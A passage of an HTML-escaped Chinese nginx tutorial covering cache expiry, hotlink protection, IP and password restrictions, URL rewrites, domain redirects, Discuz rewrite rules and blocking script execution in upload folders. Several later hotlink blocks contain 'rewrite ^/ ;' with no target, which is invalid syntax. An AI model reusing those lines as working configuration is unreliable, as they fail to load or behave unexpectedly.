/&gt;&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;&lt;strong&gt;给favicon.ico和robots.txt设置过期时间;&lt;/strong&gt;&lt;br /&gt;这里为favicon.ico为99天,robots.txt为7天并不记录404错误日志&lt;/p&gt;&lt;div class=&quot;hl-surround&quot;&gt;&lt;ol class=&quot;hl-main ln-show list-paddingleft-2&quot; title=&quot;Double click to hide line number.&quot;&gt;&lt;li class=&quot;hl-firstline&quot;&gt;&lt;p&gt;location ~(favicon.ico) {&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt; &amp;nbsp; log_not_found off;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;expires 99d;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;break;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;}&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;location ~(robots.txt) {&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt; &amp;nbsp; log_not_found off;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;expires 7d;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;break;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;}&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;设定某个文件的过期时间;这里为600秒，并不记录访问日志&lt;/strong&gt;&lt;/p&gt;&lt;div class=&quot;hl-surround&quot;&gt;&lt;ol class=&quot;hl-main ln-show list-paddingleft-2&quot; title=&quot;Double click to hide line number.&quot;&gt;&lt;li class=&quot;hl-firstline&quot;&gt;&lt;p&gt;location ^~ /html/scripts/loadhead_1.js {&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt; &amp;nbsp; access_log off;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt; &amp;nbsp; root /opt/lampp/htdocs/web;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;expires 600;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;break;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;}&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;文件反盗链并设置过期时间&lt;/strong&gt;&lt;br /&gt;这里的return 412 为自定义的http状态码，默认为403，方便找出正确的盗链的请求&lt;br /&gt;&ldquo;rewrite ^/ http://leech.c1gstudio.com/leech.gif;&rdquo;显示一张防盗链图片&lt;br /&gt;&ldquo;access_log off;&rdquo;不记录访问日志，减轻压力&lt;br /&gt;&ldquo;expires 3d&rdquo;所有文件3天的浏览器缓存&lt;/p&gt;&lt;div class=&quot;hl-surround&quot;&gt;&lt;ol class=&quot;hl-main ln-show list-paddingleft-2&quot; title=&quot;Double click to hide line number.&quot;&gt;&lt;li class=&quot;hl-firstline&quot;&gt;&lt;p&gt;location ~* ^.+.(jpg|jpeg|gif|png|swf|rar|zip|css|js)$ {&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;valid_referers none blocked *.c1gstudio.com *.c1gstudio.net localhost 208.97.167.194;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;if ($invalid_referer) {&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;rewrite ^/ http://leech.c1gstudio.com/leech.gif;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;return 412;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;break;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;}&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt; &amp;nbsp; access_log off;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt; &amp;nbsp; root /opt/lampp/htdocs/web;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;expires 3d;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;break;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;}&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;只充许固定ip访问网站，并加上密码&lt;/strong&gt;&lt;/p&gt;&lt;div class=&quot;hl-surround&quot;&gt;&lt;ol class=&quot;hl-main ln-show list-paddingleft-2&quot; title=&quot;Double click to hide line number.&quot;&gt;&lt;li class=&quot;hl-firstline&quot;&gt;&lt;p&gt;root /opt/htdocs/www;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;allow 208.97.167.194;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;allow 222.33.1.2;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;allow 231.152.49.4;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;deny all;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;auth_basic &amp;quot;C1G_ADMIN&amp;quot;;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;auth_basic_user_file htpasswd;&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;将多级目录下的文件转成一个文件，增强seo效果&lt;/strong&gt;&lt;br /&gt;/job-123-456-789.html 指向/job/123/456/789.html&lt;/p&gt;&lt;div class=&quot;hl-surround&quot;&gt;&lt;ol class=&quot;hl-main ln-show list-paddingleft-2&quot; title=&quot;Double click to hide line number.&quot;&gt;&lt;li class=&quot;hl-firstline&quot;&gt;&lt;p&gt;rewrite ^/job-([0-9]+)-([0-9]+)-([0-9]+).html$ /job/$1/$2/jobshow_$3.html last;&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;将根目录下某个文件夹指向2级目录&lt;/strong&gt;&lt;br /&gt;如/&lt;strong&gt;shanghai&lt;/strong&gt;job/ 指向 /area/&lt;strong&gt;shanghai&lt;/strong&gt;/&lt;br /&gt;如果你将last改成permanent，那么浏览器地址栏显是/location/shanghai/&lt;/p&gt;&lt;div class=&quot;hl-surround&quot;&gt;&lt;ol class=&quot;hl-main ln-show list-paddingleft-2&quot; title=&quot;Double click to hide line number.&quot;&gt;&lt;li class=&quot;hl-firstline&quot;&gt;&lt;p&gt;rewrite ^/([0-9a-z]+)job/(.*)$ /area/$1/$2 last;&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;/div&gt;&lt;p&gt;上面例子有个问题是访问/shanghai 时将不会匹配&lt;/p&gt;&lt;div class=&quot;hl-surround&quot;&gt;&lt;ol class=&quot;hl-main ln-show list-paddingleft-2&quot; title=&quot;Double click to hide line number.&quot;&gt;&lt;li class=&quot;hl-firstline&quot;&gt;&lt;p&gt;rewrite ^/([0-9a-z]+)job$ /area/$1/ last;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;rewrite ^/([0-9a-z]+)job/(.*)$ /area/$1/$2 last;&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;/div&gt;&lt;p&gt;这样/shanghai 也可以访问了，但页面中的相对链接无法使用，&lt;br /&gt;如./list_1.html真实地址是/area/shanghia/list_1.html会变成/list_1.html,导至无法访问。&lt;/p&gt;&lt;p&gt;那我加上自动跳转也是不行咯&lt;br /&gt;(-d $request_filename)它有个条件是必需为真实目录，而我的rewrite不是的，所以没有效果&lt;/p&gt;&lt;div class=&quot;hl-surround&quot;&gt;&lt;ol class=&quot;hl-main ln-show list-paddingleft-2&quot; title=&quot;Double click to hide line number.&quot;&gt;&lt;li class=&quot;hl-firstline&quot;&gt;&lt;p&gt;if (-d $request_filename){&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;rewrite ^/(.*)([^/])$ http://$host/$1$2/ permanent;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;}&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;/div&gt;&lt;p&gt;知道原因后就好办了，让我手动跳转吧&lt;/p&gt;&lt;div class=&quot;hl-surround&quot;&gt;&lt;ol class=&quot;hl-main ln-show list-paddingleft-2&quot; title=&quot;Double click to hide line number.&quot;&gt;&lt;li class=&quot;hl-firstline&quot;&gt;&lt;p&gt;rewrite ^/([0-9a-z]+)job$ /$1job/ permanent;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;rewrite ^/([0-9a-z]+)job/(.*)$ /area/$1/$2 last;&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;文件和目录不存在的时候重定向：&lt;/strong&gt;&lt;/p&gt;&lt;div class=&quot;hl-surround&quot;&gt;&lt;ol class=&quot;hl-main ln-show list-paddingleft-2&quot; title=&quot;Double click to hide line number.&quot;&gt;&lt;li class=&quot;hl-firstline&quot;&gt;&lt;p&gt;if (!-e $request_filename) {&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;proxy_pass http://127.0.0.1;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;}&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;域名跳转&lt;/strong&gt;&lt;/p&gt;&lt;div class=&quot;hl-surround&quot;&gt;&lt;ol class=&quot;hl-main ln-show list-paddingleft-2&quot; title=&quot;Double click to hide line number.&quot;&gt;&lt;li class=&quot;hl-firstline&quot;&gt;&lt;p&gt;server&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt; &amp;nbsp; {&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt; &amp;nbsp; listen 80;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt; &amp;nbsp; server_name jump.c1gstudio.com;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt; &amp;nbsp; index index.html index.htm index.php;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt; &amp;nbsp; root /opt/lampp/htdocs/www;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt; &amp;nbsp; rewrite ^/ http://www.c1gstudio.com/;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt; &amp;nbsp; access_log off;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt; &amp;nbsp; }&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;多域名转向&lt;/strong&gt;&lt;/p&gt;&lt;div class=&quot;hl-surround&quot;&gt;&lt;ol class=&quot;hl-main ln-show list-paddingleft-2&quot; title=&quot;Double click to hide line number.&quot;&gt;&lt;li class=&quot;hl-firstline&quot;&gt;&lt;p&gt;server_name www.c1gstudio.com www.c1gstudio.net;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt; &amp;nbsp; index index.html index.htm index.php;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt; &amp;nbsp; root /opt/lampp/htdocs;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;if ($host ~ &amp;quot;c1gstudio.net&amp;quot;) {&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;rewrite ^(.*) http://www.c1gstudio.com$1 permanent;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;}&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;三级域名跳转&lt;/strong&gt;&lt;/p&gt;&lt;div class=&quot;hl-surround&quot;&gt;&lt;ol class=&quot;hl-main ln-show list-paddingleft-2&quot; title=&quot;Double click to hide line number.&quot;&gt;&lt;li class=&quot;hl-firstline&quot;&gt;&lt;p&gt;if ($http_host ~* &amp;quot;^(.*).i.c1gstudio.com$&amp;quot;) {&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;rewrite ^(.*) http://top.yingjiesheng.com$1;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;break;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;}&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;域名镜向&lt;/strong&gt;&lt;/p&gt;&lt;div class=&quot;hl-surround&quot;&gt;&lt;ol class=&quot;hl-main ln-show list-paddingleft-2&quot; title=&quot;Double click to hide line number.&quot;&gt;&lt;li class=&quot;hl-firstline&quot;&gt;&lt;p&gt;server&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt; &amp;nbsp; {&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt; &amp;nbsp; listen 80;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt; &amp;nbsp; server_name mirror.c1gstudio.com;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt; &amp;nbsp; index index.html index.htm index.php;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt; &amp;nbsp; root /opt/lampp/htdocs/www;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt; &amp;nbsp; rewrite ^/(.*) http://www.c1gstudio.com/$1 last;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt; &amp;nbsp; access_log off;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt; &amp;nbsp; }&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;某个子目录作镜向&lt;/strong&gt;&lt;/p&gt;&lt;div class=&quot;hl-surround&quot;&gt;&lt;ol class=&quot;hl-main ln-show list-paddingleft-2&quot; title=&quot;Double click to hide line number.&quot;&gt;&lt;li class=&quot;hl-firstline&quot;&gt;&lt;p&gt;location ^~ /zhaopinhui {&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;rewrite ^.+ http://zph.c1gstudio.com/ last;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;break;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;}&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;discuz ucenter home (uchome) rewrite&lt;/strong&gt;&lt;/p&gt;&lt;div class=&quot;hl-surround&quot;&gt;&lt;ol class=&quot;hl-main ln-show list-paddingleft-2&quot; title=&quot;Double click to hide line number.&quot;&gt;&lt;li class=&quot;hl-firstline&quot;&gt;&lt;p&gt;rewrite ^/(space|network)-(.+).html$ /$1.php?rewrite=$2 last;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;rewrite ^/(space|network).html$ /$1.php last;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;rewrite ^/([0-9]+)$ /space.php?uid=$1 last;&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;discuz 7 rewrite&lt;/strong&gt;&lt;/p&gt;&lt;div class=&quot;hl-surround&quot;&gt;&lt;ol class=&quot;hl-main ln-show list-paddingleft-2&quot; title=&quot;Double click to hide line number.&quot;&gt;&lt;li class=&quot;hl-firstline&quot;&gt;&lt;p&gt;rewrite ^(.*)/archiver/((fid|tid)-[w-]+.html)$ $1/archiver/index.php?$2 last;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;rewrite ^(.*)/forum-([0-9]+)-([0-9]+).html$ $1/forumdisplay.php?fid=$2&amp;amp;page=$3 last;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;rewrite ^(.*)/thread-([0-9]+)-([0-9]+)-([0-9]+).html$ $1/viewthread.php?tid=$2&amp;amp;extra=page\\%3D$4&amp;amp;page=$3 last;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;rewrite ^(.*)/profile-(username|uid)-(.+).html$ $1/viewpro.php?$2=$3 last;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;rewrite ^(.*)/space-(username|uid)-(.+).html$ $1/space.php?$2=$3 last;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;rewrite ^(.*)/tag-(.+).html$ $1/tag.php?name=$2 last;&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;给discuz某版块单独配置域名&lt;/strong&gt;&lt;/p&gt;&lt;div class=&quot;hl-surround&quot;&gt;&lt;ol class=&quot;hl-main ln-show list-paddingleft-2&quot; title=&quot;Double click to hide line number.&quot;&gt;&lt;li class=&quot;hl-firstline&quot;&gt;&lt;p&gt;server_name bbs.c1gstudio.com news.c1gstudio.com;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;location = / {&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;if ($http_host ~ news.c1gstudio.com$) {&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;rewrite ^.+ http://news.c1gstudio.com/forum-831-1.html last;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;break;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;}&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;}&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;discuz ucenter 头像 rewrite 优化&lt;/strong&gt;&lt;/p&gt;&lt;div class=&quot;hl-surround&quot;&gt;&lt;ol class=&quot;hl-main ln-show list-paddingleft-2&quot; title=&quot;Double click to hide line number.&quot;&gt;&lt;li class=&quot;hl-firstline&quot;&gt;&lt;p&gt;location ^~ /ucenter {&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;location ~ .*.php?$&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;{&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;#fastcgi_pass unix:/tmp/php-cgi.sock;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;fastcgi_pass 127.0.0.1:9000;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;fastcgi_index index.php;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;include fcgi.conf; &lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;}&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;location /ucenter/data/avatar {&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;log_not_found off;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;access_log off;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;location ~ /(.*)_big.jpg$ {&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;error_page 404 /ucenter/images/noavatar_big.gif;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;}&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;location ~ /(.*)_middle.jpg$ {&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;error_page 404 /ucenter/images/noavatar_middle.gif;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;}&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;location ~ /(.*)_small.jpg$ {&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;error_page 404 /ucenter/images/noavatar_small.gif;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;}&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;expires 300;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;break;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;}&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt; &amp;nbsp; }&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;jspace rewrite&lt;/strong&gt;&lt;/p&gt;&lt;div class=&quot;hl-surround&quot;&gt;&lt;ol class=&quot;hl-main ln-show list-paddingleft-2&quot; title=&quot;Double click to hide line number.&quot;&gt;&lt;li class=&quot;hl-firstline&quot;&gt;&lt;p&gt;location ~ .*.php?$&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt; &amp;nbsp; {&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt; &amp;nbsp; #fastcgi_pass unix:/tmp/php-cgi.sock;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt; &amp;nbsp; fastcgi_pass 127.0.0.1:9000;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt; &amp;nbsp; fastcgi_index index.php;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt; &amp;nbsp; include fcgi.conf; &lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt; &amp;nbsp; }&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt; &amp;nbsp; location ~* ^/index.php/&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt; &amp;nbsp; {&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt; &amp;nbsp; rewrite ^/index.php/(.*) /index.php?$1 break;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt; &amp;nbsp; fastcgi_pass 127.0.0.1:9000;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt; &amp;nbsp; fastcgi_index index.php;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt; &amp;nbsp; include fcgi.conf;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt; &amp;nbsp; }&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;/div&gt;&lt;br /&gt;&lt;h2&gt;&lt;a name=&quot;t0&quot;&gt;&lt;/a&gt;&lt;span style=&quot;font-size:12px&quot;&gt;nginx设置上传目录无执行权限&lt;/span&gt;&lt;/h2&gt;&lt;h2&gt;&lt;a name=&quot;t1&quot;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;location ~ ^/upload/.*.(php|php5)$&lt;br /&gt;{&lt;br /&gt;deny all;&lt;br /&gt;}&lt;/p&gt;&lt;p&gt;其中upload换为你要设置的目录名字&lt;/p&gt;&lt;p&gt;这条规则的含义是匹配请求连接中开头是/upload/，中间匹配任意字符，结尾匹配.php或者.php5的页面，最后利用deny all禁止访问，这样就防止了上传目录的脚本执行权限&lt;/p&gt;&lt;br /&gt;&lt;h2&gt;&lt;a name=&quot;t2&quot;&gt;&lt;/a&gt;&lt;span style=&quot;font-size:12px&quot;&gt;为nginx设置默认虚拟主机（空主机头，默认主机头）&lt;/span&gt;&lt;/h2&gt;&lt;br /&gt;&lt;p&gt;nginx的默认虚拟主机在用户通过IP访问，或者通过未设置的域名访问（比如有人把他自己的域名指向了你的ip）的时候生效&lt;/p&gt;&lt;p&gt;最关键的一点事，在server的设置里面添加这一行：&lt;br /&gt;listen 80 default;&lt;br /&gt;后面的default参数表示这个是默认虚拟主机。&lt;/p&gt;&lt;p&gt;这个设置非常有用。&lt;br /&gt;比如别人通过ip或者未知域名访问你的网站的时候，你希望禁止显示任何有效内容，可以给他返回500.&lt;br /&gt;目前国内很多机房都要求网站主关闭空主机头，防止未备案的域名指向过来造成麻烦。就可以这样设置：&lt;br /&gt;server {&lt;br /&gt;listen 80 default;&lt;br /&gt;return 500;&lt;br /&gt;}&lt;/p&gt;&lt;p&gt;也可以把这些流量收集起来，导入到自己的网站，只要做以下跳转设置就可以：&lt;br /&gt;server {&lt;br /&gt;listen 80 default;&lt;br /&gt;rewrite ^(.*) http://www.myip.net permanent;&lt;br /&gt;}&lt;/p&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;防盗链&lt;/span&gt;&lt;br /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;针对不同的文件类型 &lt;/span&gt;&lt;br /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;#Preventing hot linking of images and other file types&lt;/span&gt;&lt;br /&gt;location ~* ^.+.(gif|jpg|png|swf|flv|rar|zip)$ {&lt;br /&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;valid_referers none blocked server_names *.linuxtone.org linuxtone.org http://localhost baidu.com;&lt;br /&gt;if ($invalid_referer) {&lt;br /&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp;rewrite &amp;nbsp; ^/ &amp;nbsp; ;&lt;br /&gt; &amp;nbsp; &amp;nbsp; # return &amp;nbsp; 403;&lt;br /&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp;}&lt;br /&gt;}&lt;br /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;针对不同的目录&lt;/span&gt;&lt;br /&gt;location /img/ {&lt;br /&gt; &amp;nbsp; &amp;nbsp;root /data/www/wwwroot/bbs/img/;&lt;br /&gt; &amp;nbsp; &amp;nbsp;valid_referers none blocked server_names *.linuxtone.org http://localhost baidu.com;&lt;br /&gt; &amp;nbsp; &amp;nbsp;if ($invalid_referer) {&lt;br /&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; rewrite ^/ ;&lt;br /&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; #return &amp;nbsp; 403;&lt;br /&gt; &amp;nbsp; &amp;nbsp;}&lt;br /&gt;}&lt;br /&gt;&lt;br /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;同实现防盗链和expires的方法 &lt;/span&gt;&lt;br /&gt;&lt;br /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;#Preventing hot linking of images and other file types&lt;/span&gt;&lt;br /&gt;location ~* ^.+.(gif|jpg|png|swf|flv|rar|zip)$ {&lt;br /&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;valid_referers none blocked server_names *.linuxtone.org linuxtone.org http://localhost ;&lt;br /&gt;if ($invalid_referer) {&lt;br /&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp;rewrite &amp;nbsp; ^/ &amp;nbsp; ;&lt;br /&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; }&lt;br /&gt; &amp;nbsp; &amp;nbsp; access_log off;&lt;br /&gt; &amp;nbsp; &amp;nbsp; root /data/www/wwwroot/bbs;&lt;br /&gt;expires 1d;&lt;br /&gt; &amp;nbsp; &amp;nbsp; break;&lt;br /&gt;}&lt;br /&gt;&lt;br /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;Nginx 身份证验证&lt;/span&gt;&lt;br /&gt;&lt;br /&gt;#cd /usr/local/nginx/conf&lt;br /&gt;#mkdir htpasswd&lt;br /&gt;/usr/local/apache2/bin/htpasswd -c /usr/local/nginx/conf/htpasswd/tongji linuxtone&lt;br /&gt;#添加用户名为linuxtone&lt;br /&gt;New password: &amp;nbsp; (此处输入你的密码)&lt;br /&gt;Re-type new password: &amp;nbsp; (再次输入你的密码)&lt;br /&gt;Adding password for user&lt;br /&gt;http://count.linuxtone.org/tongji/data/index.html(目录存在/data/www/wwwroot/tongji/data/目录下)&lt;br /&gt;将下段配置放到虚拟主机目录，当访问http://count.linuxtone/tongji/即提示要密验证:&lt;br /&gt;location ~ ^/(tongji)/ {&lt;br /&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;root &amp;nbsp; &amp;nbsp;/data/www/wwwroot/count;&lt;br /&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;auth_basic &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;quot;LT-COUNT-TongJi&amp;quot;;&lt;br /&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;auth_basic_user_file /usr/local/nginx/conf/htpasswd/tongji;&lt;br /&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;}&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;Nginx 